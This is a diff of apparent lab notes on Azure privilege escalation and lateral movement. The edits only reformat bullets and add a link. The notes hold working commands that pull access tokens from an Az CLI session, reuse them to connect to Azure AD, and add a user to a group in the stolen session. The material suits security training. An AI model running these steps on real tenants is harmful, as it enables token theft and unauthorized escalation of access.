@@ -23,7 +23,7 @@ Enumeration and Initial Access
 Privilege Escalation and Lateral Movement
 - [Runbooks - latmove and privesc](https://github.com/conma293/Azure/blob/main/killcycle.md#runbooks)
   - Az CLI Recon
-  - Steal tokens from Az CLI for latmove
+  - [Steal tokens from Az CLI for latmove](https://github.com/conma293/Azure/blob/main/killcycle.md#steal-tokens-for-student-vm)
   - Add user to group in stolen session
 * * *
 
@@ -641,12 +641,12 @@ az automation account list
 #### Steal tokens for Student VM
 
 - To be able to interact with Azure AD, request a token for graph. We can use that token with either module
-- MG:
+  - MG:
 ```
 az account get-access-token --resource-type ms-graph
 $mgToken = 'eyJ0..'
 ```
-or AAD:
+- or AAD:
 ```
 az account get-access-token --resource-type aad-graph
 $aadToken = 'eyJ0..'
@@ -663,11 +663,12 @@ Connect-AzureAD -AadAccessToken $aadToken -TenantId 2d50cb29-5f7b-48a4-87ce-fe75
 ```
 #### Adding to group 
 - Now, let's add Mark as a member of the group. In the below command ```–GroupId``` is for the group object id.
+  - MG:
 ```
 $params = @{"@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/f66e133c-bd01-4b0b-b3b7-7cd949fd45f3"}
 New-MgGroupMemberByRef -GroupId e6870783-1378-4078-b242-84c08c6dc0d7 -BodyParameter $params
 ```
-OR AAD:
+- OR AAD:
 ```
 Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
 ```
